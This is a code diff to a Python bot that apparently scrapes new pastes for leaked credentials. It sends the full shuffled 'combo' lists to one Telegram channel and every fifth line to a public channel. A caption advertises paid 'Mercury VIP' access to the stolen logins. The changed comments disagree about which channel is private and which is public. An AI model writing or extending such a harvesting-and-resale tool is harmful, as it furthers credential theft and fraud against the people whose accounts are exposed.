@@ -25,8 +25,8 @@ NEW_CHANNEL_ID     = int(os.environ["NEW_CHANNEL_ID"])      # new URL alerts onl
 CONTENT_CHANNEL_ID = int(os.environ["CONTENT_CHANNEL_ID"]) # extracted credentials from new pastes
 
 TELEGRAM_TOKEN       = os.environ["TELEGRAM_TOKEN"]
-TELEGRAM_CHAT        = os.environ["TELEGRAM_CHAT"]         # private channel
-TELEGRAM_PUBLIC_CHAT = os.environ["TELEGRAM_PUBLIC_CHAT"]  # public channel
+TELEGRAM_CHAT        = os.environ["TELEGRAM_CHAT"]         # public channel (every 5th line)
+TELEGRAM_PUBLIC_CHAT = os.environ["TELEGRAM_PUBLIC_CHAT"]  # private channel (all combos)
 
 CHECK_INTERVAL = 1
 PAGES_TO_SCAN  = 5
@@ -310,16 +310,17 @@ async def monitor_loop():
                                 all_creds.append(line)
                     random.shuffle(all_creds)
                     tg_output = tg_header + "\n".join(all_creds)
-                    # Private channel — full file
-                    await send_telegram_file(tg_output, filename)
+
+                    # TELEGRAM_CHAT = private channel — gets ALL combos
+                    await send_telegram_file(tg_output, filename, chat_id=TELEGRAM_CHAT)
                     tg_caption = (
                         f"{len(all_creds)} COMBO FILE\n"
                         "            BUY MERCURY VIP AT @xn9bowner\n"
                         "            10 LIFETIME 5 MONTHLY"
                     )
-                    await send_telegram_message(tg_caption)
+                    await send_telegram_message(tg_caption, chat_id=TELEGRAM_CHAT)
 
-                    # Public channel — every 5th line only
+                    # TELEGRAM_PUBLIC_CHAT = public channel — gets every 5th line only
                     public_creds = all_creds[::5]
                     if public_creds:
                         pub_output = tg_header + "\n".join(public_creds)
